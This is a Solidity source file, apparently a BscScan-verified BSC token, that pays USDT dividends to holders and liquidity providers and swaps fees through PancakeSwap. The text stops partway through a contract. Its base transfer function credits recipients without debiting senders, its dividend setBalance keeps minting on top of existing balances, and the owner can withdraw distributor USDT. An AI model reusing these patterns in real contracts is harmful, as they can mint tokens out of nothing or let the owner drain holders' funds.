/**
 *Submitted for verification at BscScan.com on 2023-05-15
*/

// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity >=0.8.17;

abstract contract ERC20 {
    /*//////////////////////////////////////////////////////////////
                                 EVENTS
    //////////////////////////////////////////////////////////////*/

    event Transfer(address indexed from, address indexed to, uint256 amount);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 amount
    );

    /*//////////////////////////////////////////////////////////////
                            METADATA STORAGE
    //////////////////////////////////////////////////////////////*/

    string public name;

    string public symbol;

    uint8 public immutable decimals;

    /*//////////////////////////////////////////////////////////////
                              ERC20 STORAGE
    //////////////////////////////////////////////////////////////*/

    uint256 public totalSupply;

    mapping(address => uint256) internal _balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    /*//////////////////////////////////////////////////////////////
                               ERC20 LOGIC
    //////////////////////////////////////////////////////////////*/

    function approve(
        address spender,
        uint256 amount
    ) public virtual returns (bool) {
        allowance[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);

        return true;
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.

        if (allowed != type(uint256).max)
            allowance[from][msg.sender] = allowed - amount;

        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            _balanceOf[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function _mint(address to, uint256 amount) internal virtual {
        totalSupply += amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            _balanceOf[to] += amount;
        }

        emit Transfer(address(0), to, amount);
    }

    function _burn(address from, uint256 amount) internal virtual {
        _balanceOf[from] -= amount;

        // Cannot underflow because a user's balance
        // will never be larger than the total supply.
        unchecked {
            totalSupply -= amount;
        }

        emit Transfer(from, address(0), amount);
    }
}

abstract contract Owned {
    /*//////////////////////////////////////////////////////////////
                                 EVENTS
    //////////////////////////////////////////////////////////////*/

    event OwnershipTransferred(address indexed user, address indexed newOwner);

    /*//////////////////////////////////////////////////////////////
                            OWNERSHIP STORAGE
    //////////////////////////////////////////////////////////////*/

    address public owner;

    modifier onlyOwner() virtual {
        require(msg.sender == owner, "UNAUTHORIZED");

        _;
    }

    /*//////////////////////////////////////////////////////////////
                               CONSTRUCTOR
    //////////////////////////////////////////////////////////////*/

    constructor(address _owner) {
        owner = _owner;

        emit OwnershipTransferred(address(0), _owner);
    }

    /*//////////////////////////////////////////////////////////////
                             OWNERSHIP LOGIC
    //////////////////////////////////////////////////////////////*/

    function transferOwnership(address newOwner) public virtual onlyOwner {
        owner = newOwner;

        emit OwnershipTransferred(msg.sender, newOwner);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function getAmountsOut(
        uint256 amountIn,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function swapTokensForExactETH(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapETHForExactTokens(
        uint amountOut,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
}

interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

library SafeMathUint {
    function toInt256Safe(uint256 a) internal pure returns (int256) {
        int256 b = int256(a);
        require(b >= 0);
        return b;
    }
}

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    /**
     * @dev Multiplies two int256 variables and fails on overflow.
     */
    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        // Detect overflow when multiplying MIN_INT256 with -1
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    /**
     * @dev Division of two int256 variables and fails on overflow.
     */
    function div(int256 a, int256 b) internal pure returns (int256) {
        // Prevent overflow when dividing MIN_INT256 by -1
        require(b != -1 || a != MIN_INT256);

        // Solidity already throws when dividing by 0.
        return a / b;
    }

    /**
     * @dev Subtracts two int256 variables and fails on overflow.
     */
    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    /**
     * @dev Adds two int256 variables and fails on overflow.
     */
    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    /**
     * @dev Converts to absolute value, and fails on overflow.
     */
    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }

    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}

abstract contract N_ERC20 {
    event Transfer(address indexed from, address indexed to, uint256 amount);

    /*//////////////////////////////////////////////////////////////
                            METADATA STORAGE
    //////////////////////////////////////////////////////////////*/

    string public name;

    string public symbol;

    uint8 public immutable decimals;

    /*//////////////////////////////////////////////////////////////
                              ERC20 STORAGE
    //////////////////////////////////////////////////////////////*/

    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    /*//////////////////////////////////////////////////////////////
    INTERNAL MINT/BURN LOGIC
    //////////////////////////////////////////////////////////////*/

    function _mint(address to, uint256 amount) internal virtual {
        totalSupply += amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(address(0), to, amount);
    }

    function _burn(address from, uint256 amount) internal virtual {
        balanceOf[from] -= amount;

        // Cannot underflow because a user's balance
        // will never be larger than the total supply.
        unchecked {
            totalSupply -= amount;
        }

        emit Transfer(from, address(0), amount);
    }
}

abstract contract DividendPayingToken is N_ERC20, Owned {
    using SafeMath for uint256;
    using SafeMathUint for uint256;
    using SafeMathInt for int256;

    address public immutable dToken;

    // With `magnitude`, we can properly distribute dividends even if the amount of received ether is small.
    // For more discussion about choosing the value of `magnitude`,
    //  see https://github.com/ethereum/EIPs/issues/1726#issuecomment-472352728
    uint256 internal constant magnitude = 2 ** 128;

    uint256 internal magnifiedDividendPerShare;

    // About dividendCorrection:
    // If the token balance of a `_user` is never changed, the dividend of `_user` can be computed with:
    //   `dividendOf(_user) = dividendPerShare * balanceOf(_user)`.
    // When `balanceOf(_user)` is changed (via minting/burning/transferring tokens),
    //   `dividendOf(_user)` should not be changed,
    //   but the computed value of `dividendPerShare * balanceOf(_user)` is changed.
    // To keep the `dividendOf(_user)` unchanged, we add a correction term:
    //   `dividendOf(_user) = dividendPerShare * balanceOf(_user) + dividendCorrectionOf(_user)`,
    //   where `dividendCorrectionOf(_user)` is updated whenever `balanceOf(_user)` is changed:
    //   `dividendCorrectionOf(_user) = dividendPerShare * (old balanceOf(_user)) - (new balanceOf(_user))`.
    // So now `dividendOf(_user)` returns the same value before and after `balanceOf(_user)` is changed.
    mapping(address => int256) internal magnifiedDividendCorrections;
    mapping(address => uint256) internal withdrawnDividends;

    uint256 public totalDividendsDistributed;

    constructor(
        string memory _name,
        string memory _symbol,
        address _dToken
    ) N_ERC20(_name, _symbol, 18) {
        dToken = _dToken;
    }

    function distributeDividends(uint256 amount) public onlyOwner {
        require(totalSupply > 0);

        if (amount > 0) {
            magnifiedDividendPerShare = magnifiedDividendPerShare.add(
                (amount).mul(magnitude) / totalSupply
            );
            totalDividendsDistributed = totalDividendsDistributed.add(amount);
        }
    }

    /// @notice Withdraws the ether distributed to the sender.
    /// @dev It emits a `DividendWithdrawn` event if the amount of withdrawn ether is greater than 0.
    function withdrawDividend() public virtual {
        _withdrawDividendOfUser(msg.sender);
    }

    /// @notice Withdraws the ether distributed to the sender.
    /// @dev It emits a `DividendWithdrawn` event if the amount of withdrawn ether is greater than 0.
    function _withdrawDividendOfUser(address user) internal returns (uint256) {
        uint256 _withdrawableDividend = withdrawableDividendOf(user);
        if (_withdrawableDividend > 0) {
            withdrawnDividends[user] = withdrawnDividends[user].add(
                _withdrawableDividend
            );
            bool success = IERC20(dToken).transfer(user, _withdrawableDividend);

            if (!success) {
                withdrawnDividends[user] = withdrawnDividends[user].sub(
                    _withdrawableDividend
                );
                return 0;
            }

            return _withdrawableDividend;
        }

        return 0;
    }

    /// @notice View the amount of dividend in wei that an address can withdraw.
    /// @param _owner The address of a token holder.
    /// @return The amount of dividend in wei that `_owner` can withdraw.
    function dividendOf(address _owner) public view returns (uint256) {
        return withdrawableDividendOf(_owner);
    }

    /// @notice View the amount of dividend in wei that an address can withdraw.
    /// @param _owner The address of a token holder.
    /// @return The amount of dividend in wei that `_owner` can withdraw.
    function withdrawableDividendOf(
        address _owner
    ) public view returns (uint256) {
        return accumulativeDividendOf(_owner).sub(withdrawnDividends[_owner]);
    }

    /// @notice View the amount of dividend in wei that an address has withdrawn.
    /// @param _owner The address of a token holder.
    /// @return The amount of dividend in wei that `_owner` has withdrawn.
    function withdrawnDividendOf(address _owner) public view returns (uint256) {
        return withdrawnDividends[_owner];
    }

    /// @notice View the amount of dividend in wei that an address has earned in total.
    /// @dev accumulativeDividendOf(_owner) = withdrawableDividendOf(_owner) + withdrawnDividendOf(_owner)
    /// = (magnifiedDividendPerShare * balanceOf(_owner) + magnifiedDividendCorrections[_owner]) / magnitude
    /// @param _owner The address of a token holder.
    /// @return The amount of dividend in wei that `_owner` has earned in total.
    function accumulativeDividendOf(
        address _owner
    ) public view returns (uint256) {
        return
            magnifiedDividendPerShare
                .mul(balanceOf[_owner])
                .toInt256Safe()
                .add(magnifiedDividendCorrections[_owner])
                .toUint256Safe() / magnitude;
    }

    /// @param account The account that will receive the created tokens.
    /// @param value The amount that will be created.
    function _mint(address account, uint256 value) internal override {
        super._mint(account, value);

        magnifiedDividendCorrections[account] = magnifiedDividendCorrections[
            account
        ].sub((magnifiedDividendPerShare.mul(value)).toInt256Safe());
    }

    /// @dev Internal function that burns an amount of the token of a given account.
    /// Update magnifiedDividendCorrections to keep dividends unchanged.
    /// @param account The account whose tokens will be burnt.
    /// @param value The amount that will be burnt.
    function _burn(address account, uint256 value) internal override {
        super._burn(account, value);

        magnifiedDividendCorrections[account] = magnifiedDividendCorrections[
            account
        ].add((magnifiedDividendPerShare.mul(value)).toInt256Safe());
    }

    function _setBalance(address account, uint256 newBalance) internal {
        _mint(account, newBalance);
    }
}

contract DividendDistributor is Owned, DividendPayingToken {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    struct MAP {
        address[] keys;
        mapping(address => uint256) values;
        mapping(address => uint256) indexOf;
        mapping(address => bool) inserted;
    }

    MAP private tokenHoldersMap;
    uint256 public lastProcessedIndex;

    mapping(address => bool) public excludedFromDividends;

    mapping(address => uint256) public lastClaimTimes;

    uint256 public claimWait;
    uint256 public minimumTokenBalanceForDividends;

    event ExcludeFromDividends(address indexed account);
    event ClaimWaitUpdated(uint256 indexed newValue, uint256 indexed oldValue);

    event Claim(
        address indexed account,
        uint256 amount,
        bool indexed automatic
    );

    constructor(
        address dT,
        uint256 _claimWait,
        uint256 _minimumTokenBalanceForDividends
    )
        Owned(msg.sender)
        DividendPayingToken("d_Dividen_Tracker", "d_Dividend_Tracker", dT)
    {
        claimWait = _claimWait;
        minimumTokenBalanceForDividends = _minimumTokenBalanceForDividends;
    }

    function withdrawDividend() public pure override {
        require(
            false,
            "d_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main d contract."
        );
    }

    function setMinimumTokenBalanceForDividends(
        uint256 val
    ) external onlyOwner {
        minimumTokenBalanceForDividends = val;
    }

    function excludeFromDividends(address account) external onlyOwner {
        require(!excludedFromDividends[account]);
        excludedFromDividends[account] = true;

        balanceOf[account] = 0;
        MAPRemove(account);

        emit ExcludeFromDividends(account);
    }

    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(
            newClaimWait >= 100 && newClaimWait <= 86400,
            "d_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours"
        );
        require(
            newClaimWait != claimWait,
            "d_Dividend_Tracker: Cannot update claimWait to same value"
        );
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }

    function transferUSDT(address to, uint256 amount) external onlyOwner {
        IERC20(USDT).transfer(to, amount);
    }

    function getLastProcessedIndex() external view returns (uint256) {
        return lastProcessedIndex;
    }

    function getNumberOfTokenHolders() external view returns (uint256) {
        return tokenHoldersMap.keys.length;
    }

    function getAccount(
        address _account
    )
        public
        view
        returns (
            address account,
            int256 index,
            int256 iterationsUntilProcessed,
            uint256 withdrawableDividends,
            uint256 totalDividends,
            uint256 lastClaimTime,
            uint256 nextClaimTime,
            uint256 secondsUntilAutoClaimAvailable
        )
    {
        account = _account;

        index = MAPGetIndexOfKey(account);

        iterationsUntilProcessed = -1;

        if (index >= 0) {
            if (uint256(index) > lastProcessedIndex) {
                iterationsUntilProcessed = index.sub(
                    int256(lastProcessedIndex)
                );
            } else {
                uint256 processesUntilEndOfArray = tokenHoldersMap.keys.length >
                    lastProcessedIndex
                    ? tokenHoldersMap.keys.length.sub(lastProcessedIndex)
                    : 0;

                iterationsUntilProcessed = index.add(
                    int256(processesUntilEndOfArray)
                );
            }
        }

        withdrawableDividends = withdrawableDividendOf(account);
        totalDividends = accumulativeDividendOf(account);

        lastClaimTime = lastClaimTimes[account];

        nextClaimTime = lastClaimTime > 0 ? lastClaimTime.add(claimWait) : 0;

        secondsUntilAutoClaimAvailable = nextClaimTime > block.timestamp
            ? nextClaimTime.sub(block.timestamp)
            : 0;
    }

    function getAccountAtIndex(
        uint256 index
    )
        public
        view
        returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        if (index >= MAPSize()) {
            return (
                0x0000000000000000000000000000000000000000,
                -1,
                -1,
                0,
                0,
                0,
                0,
                0
            );
        }

        address account = MAPGetKeyAtIndex(index);

        return getAccount(account);
    }

    function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {
        if (lastClaimTime > block.timestamp) {
            return false;
        }

        return block.timestamp.sub(lastClaimTime) >= claimWait;
    }

    function setBalance(
        address account,
        uint256 newBalance
    ) external onlyOwner {
        if (excludedFromDividends[account]) {
            return;
        }

        if (newBalance == 0) {
            _burn(account, balanceOf[account]);
            MAPRemove(account);
        } else {
            if (newBalance >= minimumTokenBalanceForDividends) {
                _setBalance(account, newBalance);
                MAPSet(account, newBalance + balanceOf[account]);
            }
            if (canAutoClaim(lastClaimTimes[account])) {
                processAccount(account, true);
            }
        }
    }

    function process(uint256 gas) public returns (uint256, uint256, uint256) {
        uint256 numberOfTokenHolders = tokenHoldersMap.keys.length;

        if (numberOfTokenHolders == 0) {
            return (0, 0, lastProcessedIndex);
        }

        uint256 _lastProcessedIndex = lastProcessedIndex;

        uint256 gasUsed = 0;

        uint256 gasLeft = gasleft();

        uint256 iterations = 0;
        uint256 claims = 0;

        while (gasUsed < gas && iterations < numberOfTokenHolders) {
            _lastProcessedIndex++;

            if (_lastProcessedIndex >= tokenHoldersMap.keys.length) {
                _lastProcessedIndex = 0;
            }

            address account = tokenHoldersMap.keys[_lastProcessedIndex];

            if (canAutoClaim(lastClaimTimes[account])) {
                if (processAccount(account, true)) {
                    claims++;
                }
            }

            iterations++;

            uint256 newGasLeft = gasleft();

            if (gasLeft > newGasLeft) {
                gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));
            }

            gasLeft = newGasLeft;
        }

        lastProcessedIndex = _lastProcessedIndex;

        return (iterations, claims, lastProcessedIndex);
    }

    function processAccount(
        address account,
        bool automatic
    ) public onlyOwner returns (bool) {
        uint256 amount = _withdrawDividendOfUser(account);

        if (amount > 0) {
            lastClaimTimes[account] = block.timestamp;
            emit Claim(account, amount, automatic);
            return true;
        }

        return false;
    }

    function MAPGet(address key) public view returns (uint256) {
        return tokenHoldersMap.values[key];
    }

    function MAPGetIndexOfKey(address key) public view returns (int256) {
        if (!tokenHoldersMap.inserted[key]) {
            return -1;
        }
        return int256(tokenHoldersMap.indexOf[key]);
    }

    function MAPGetKeyAtIndex(uint256 index) public view returns (address) {
        return tokenHoldersMap.keys[index];
    }

    function MAPSize() public view returns (uint256) {
        return tokenHoldersMap.keys.length;
    }

    function MAPSet(address key, uint256 val) public {
        if (tokenHoldersMap.inserted[key]) {
            tokenHoldersMap.values[key] = val;
        } else {
            tokenHoldersMap.inserted[key] = true;
            tokenHoldersMap.values[key] = val;
            tokenHoldersMap.indexOf[key] = tokenHoldersMap.keys.length;
            tokenHoldersMap.keys.push(key);
        }
    }

    function MAPRemove(address key) public {
        if (!tokenHoldersMap.inserted[key]) {
            return;
        }

        delete tokenHoldersMap.inserted[key];
        delete tokenHoldersMap.values[key];

        uint256 index = tokenHoldersMap.indexOf[key];
        uint256 lastIndex = tokenHoldersMap.keys.length - 1;
        address lastKey = tokenHoldersMap.keys[lastIndex];

        tokenHoldersMap.indexOf[lastKey] = index;
        delete tokenHoldersMap.indexOf[key];

        tokenHoldersMap.keys[index] = lastKey;
        tokenHoldersMap.keys.pop();
    }
}

address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

abstract contract DexBaseUSDT {
    bool public inSwapAndLiquify;
    IUniswapV2Router constant uniswapV2Router = IUniswapV2Router(ROUTER);
    address public immutable uniswapV2Pair;
    DividendDistributor public immutable distributor;

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor() {
        distributor = new DividendDistributor(USDT, 2 hours, 0.001 ether);
        distributor.setBalance(address(this), 0.01 ether);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            USDT
        );
    }
}

abstract contract LpUSDTfee is Owned, DexBaseUSDT, ERC20 {
    mapping(address => bool) public isDividendExempt;
    mapping(address => bool) public isInShareholders;
    uint256 public minPeriod = 2 hours;
    uint256 public lastLPFeefenhongTime;
    address private fromAddress;
    address private toAddress;
    uint256 distributorGas = 200000;
    address[] public shareholders;
    uint256 currentIndex;
    mapping(address => uint256) public shareholderIndexes;
    uint256 public minDistribution;

    constructor(uint256 _minDistribution) {
        minDistribution = _minDistribution;
        isDividendExempt[address(0)] = true;
        isDividendExempt[address(0xdead)] = true;
    }

    function excludeFromDividend(address account) external onlyOwner {
        isDividendExempt[account] = true;
    }

    function setDistributionCriteria(
        uint256 _minPeriod,
        uint256 _minDistribution
    ) external onlyOwner {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setUsers(address sender, address recipient) internal {
        if (fromAddress == address(0)) fromAddress = sender;
        if (toAddress == address(0)) toAddress = recipient;
        if (!isDividendExempt[fromAddress] && fromAddress != uniswapV2Pair)
            setShare(fromAddress);
        if (!isDividendExempt[toAddress] && toAddress != uniswapV2Pair)
            setShare(toAddress);
        fromAddress = sender;
        toAddress = recipient;
    }

    function dividendToUsers(address sender) public {
        if (
            IERC20(USDT).balanceOf(address(this)) >= minDistribution &&
            sender != address(this) &&
            lastLPFeefenhongTime + minPeriod <= block.timestamp
        ) {
            process(distributorGas);
            lastLPFeefenhongTime = block.timestamp;
        }
    }

    function setShare(address shareholder) private {
        if (isInShareholders[shareholder]) {
            if (IERC20(uniswapV2Pair).balanceOf(shareholder) == 0)
                quitShare(shareholder);
        } else {
            if (IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) return;
            addShareholder(shareholder);
            isInShareholders[shareholder] = true;
        }
    }

    function addShareholder(address shareholder) private {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) private {
        address lastLPHolder = shareholders[shareholders.length - 1];
        uint256 holderIndex = shareholderIndexes[shareholder];
        shareholders[holderIndex] = lastLPHolder;
        shareholderIndexes[lastLPHolder] = holderIndex;
        shareholders.pop();
    }

    function quitShare(address shareholder) private {
        removeShareholder(shareholder);
        isInShareholders[shareholder] = false;
    }

    function process(uint256 gas) private {
        uint256 shareholderCount = shareholders.length;
        if (shareholderCount == 0) return;
        uint256 nowbanance = IERC20(USDT).balanceOf(address(this));
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;
        uint256 theLpTotalSupply = IERC20(uniswapV2Pair).totalSupply();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            address theHolder = shareholders[currentIndex];
            uint256 amount;
            unchecked {
                amount = (
                    ((nowbanance * IERC20(uniswapV2Pair).balanceOf(theHolder)) /
                        theLpTotalSupply)
                );
            }
            if (amount > 0) {
                IERC20(USDT).transfer(theHolder, amount);
            }
            unchecked {
                ++currentIndex;
                ++iterations;
                gasUsed += gasLeft - gasleft();
                gasLeft = gasleft();
            }
        }
    }
}

abstract contract ExcludedFromFeeList is Owned {
    mapping(address => bool) internal _isExcludedFromFee;

    event ExcludedFromFee(address account);
    event IncludedToFee(address account);

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
        emit ExcludedFromFee(account);
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
        emit IncludedToFee(account);
    }

    function excludeMultipleAccountsFromFee(
        address[] calldata accounts
    ) public onlyOwner {
        uint256 len = uint256(accounts.length);
        for (uint256 i = 0; i < len; ) {
            _isExcludedFromFee[accounts[i]] = true;
            unchecked {
                ++i;
            }
        }
    }
}

abstract contract Market1AndBurnDivLPERC20 is Owned, DexBaseUSDT, ERC20 {
    uint256 immutable marketFee;
    uint256 immutable lpFee;
    uint256 immutable burnFee;

    address immutable marketAddr;

    bool public swapAndLiquifyEnabled;
    uint256 public numTokensSellToAddToLiquidity;

    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
    event SwapAndLiquifyEnabledUpdated(bool enabled);

    function setNumTokensSellToAddToLiquidity(uint256 _num) external onlyOwner {
        numTokensSellToAddToLiquidity = _num;
    }

    constructor(
        uint256 _numTokensSellToAddToLiquidity,
        bool _swapAndLiquifyEnabled,
        uint256 _marketFee,
        uint256 _lpFee,
        uint256 _burnFee,
        address _marketAddr
    ) {
        numTokensSellToAddToLiquidity = _numTokensSellToAddToLiquidity;
        swapAndLiquifyEnabled = _swapAndLiquifyEnabled;
        marketFee = _marketFee;
        marketAddr = _marketAddr;
        lpFee = _lpFee;
        burnFee = _burnFee;

        allowance[address(this)][address(uniswapV2Router)] = type(uint256).max;
    }

    function _takeliquidityFee(
        address sender,
        uint256 amount
    ) internal returns (uint256 liquidityAmount) {
        unchecked {
            liquidityAmount = (amount * (marketFee + lpFee + burnFee)) / 1000;
            super._transfer(sender, address(this), liquidityAmount);
        }
    }

    function shouldSwapAndLiquify(address sender) internal view returns (bool) {
        uint256 contractTokenBalance = _balanceOf[address(this)];
        bool overMinTokenBalance = contractTokenBalance >=
            numTokensSellToAddToLiquidity;
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            sender != uniswapV2Pair &&
            swapAndLiquifyEnabled
        ) {
            return true;
        } else {
            return false;
        }
    }

    function swapAndLiquify(uint256 _tokenBalance) internal lockTheSwap {
        uint256 totalFee = marketFee + lpFee + burnFee;

        uint256 balanceBefore = IERC20(USDT).balanceOf(address(distributor));

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(USDT);
        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            _tokenBalance,
            0, // accept any amount of USDT
            path,
            address(distributor),
            block.timestamp
        );
        uint256 balanceNow = IERC20(USDT).balanceOf(address(distributor));
        uint256 amount = balanceNow - balanceBefore;
        uint256 tomarketUsdt = (amount * marketFee) / totalFee;
        uint256 toLpUsdt = (amount * lpFee) / totalFee;

        distributor.transferUSDT(address(this), toLpUsdt);
        distributor.transferUSDT(marketAddr, tomarketUsdt);
        distributor.distributeDividends(amount - tomarketUsdt - toLpUsdt);
    }
}

abstract contract DividendFee is Owned, DexBaseUSDT, ERC20 {
    uint256 public numTokenToDividend = 1e18;
    uint256 public distributoBurnGas = 200000;
    bool public fenhongkaiguan = true;

    constructor() {
        distributor.excludeFromDividends(address(distributor));
        distributor.excludeFromDividends(address(this));
        distributor.excludeFromDividends(address(0xdead));
        distributor.excludeFromDividends(address(uniswapV2Pair));
    }

    function dividendToBurnUsers() public {
        if (fenhongkaiguan)
            try distributor.process(distributoBurnGas) {} catch {}
    }

    function excludeFromDividends(address account) external onlyOwner {
        distributor.excludeFromDividends(account);
    }

    function setDistributoBurnGas(uint _distributoBurnGas) external onlyOwner {
        distributoBurnGas = _distributoBurnGas;
    }

    function updateMinimumTokenBalanceForDividends(
        uint256 val
    ) public onlyOwner {
        distributor.setMinimumTokenBalanceForDividends(val);
    }

    function updatefenhongkaiguan(bool _fenhongkaiguan) public onlyOwner {
        fenhongkaiguan = _fenhongkaiguan;
    }

    function updateClaimWait(uint256 claimWait) external onlyOwner {
        distributor.updateClaimWait(claimWait);
    }

    function getClaimWait() external view returns (uint256) {
        return distributor.claimWait();
    }

    function getTotalDividendsDistributed() external view returns (uint256) {
        return distributor.totalDividendsDistributed();
    }

    function withdrawableDividendOf(
        address account
    ) public view returns (uint256) {
        return distributor.withdrawableDividendOf(account);
    }

